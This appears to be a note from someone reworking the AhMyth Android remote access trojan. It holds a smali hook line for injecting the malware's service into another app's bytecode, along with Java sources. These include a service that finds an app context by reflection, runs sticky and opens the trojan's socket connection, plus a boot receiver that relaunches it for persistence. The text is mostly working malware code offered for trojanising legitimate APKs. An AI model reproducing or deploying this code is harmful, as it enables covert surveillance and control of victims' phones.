## New Hook Method
```smali
invoke-static, {} Lcom/package/ID/ahmyth/MainService;->start()V
```
## New hopeful Hook start function

. MainActivity.java
```java
package ahmyth.mine.king.ahmyth;

import android.app.Activity;

import android.os.Bundle;

public class MainActivity extends Activity {

    @Override

    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);

        MainService.startService(this);

        finish();

    }

}
```

- MainService.java
```java
package ahmyth.mine.king.ahmyth;

import android.app.Service;

import android.content.Context;

import android.content.Intent;

import android.os.Handler;

import android.os.IBinder;

import android.os.Looper;

import java.lang.reflect.Method;

public class MainService extends Service {

    private static void findContext() throws Exception {

        Class<?> activityThreadClass;

        try {

            activityThreadClass = Class.forName("android.app.ActivityThread");

        } catch (ClassNotFoundException e) {

            // No context

            return;

        }

        final Method currentApplication = activityThreadClass.getMethod("currentApplication");

        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);

        if (context == null) {

            // Post to the UI/Main thread and try and retrieve the Context

            final Handler handler = new Handler(Looper.getMainLooper());

            handler.post(new Runnable() {

                public void run() {

                    try {

                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);

                        if (context != null) {

                            startService(context);

                        }

                    } catch (Exception ignored) {

                    }

                }

            });

        } else {

            startService(context);

        }

    }

    // Smali hook point

    public static void start() {

        try {

            findContext();

        } catch (Exception ignored) {

        }

    }

    public static void startService(Context context) {

        context.startService(new Intent(context, MainService.class));

    }

    @Override

    public IBinder onBind(Intent intent) {

        return null;

    }

    @Override

    public int onStartCommand(Intent intent, int flags, int startId) {

        IOSocket.start(this);

        return START_STICKY;

    }

}
```
- MyReciever
```java
package ahmyth.mine.king.ahmyth;

import android.content.BroadcastReceiver;

import android.content.Context;

import android.content.Intent;

public class MainBroadcastReceiver extends BroadcastReceiver {

    @Override

    public void onReceive(Context context, Intent intent) {

        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {

            MainService.startService(context);

        }

    }

}
```
